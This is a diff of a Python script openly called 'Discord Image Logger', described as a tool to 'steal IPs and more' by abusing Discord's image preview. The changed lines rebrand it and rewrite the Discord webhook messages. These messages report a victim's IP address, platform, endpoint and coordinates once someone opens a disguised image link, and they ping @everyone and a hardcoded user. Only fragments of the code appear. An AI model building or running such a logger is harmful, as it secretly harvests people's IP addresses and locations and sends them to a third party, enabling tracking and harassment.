@@ -2,8 +2,8 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "human"
-__description__ = "Security #Human"
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "Human"
 
@@ -77,7 +77,7 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "An Error Occupied , DM Human",
+            "title": "Image Logger - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
@@ -98,7 +98,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": "Bot Discord Has joined the phoro /n #HumanSecurity &AntiBots",
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -141,9 +141,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Human > An User Joined The Photo",
+            "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A Done <@817389305881296916> !**
+            "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
             
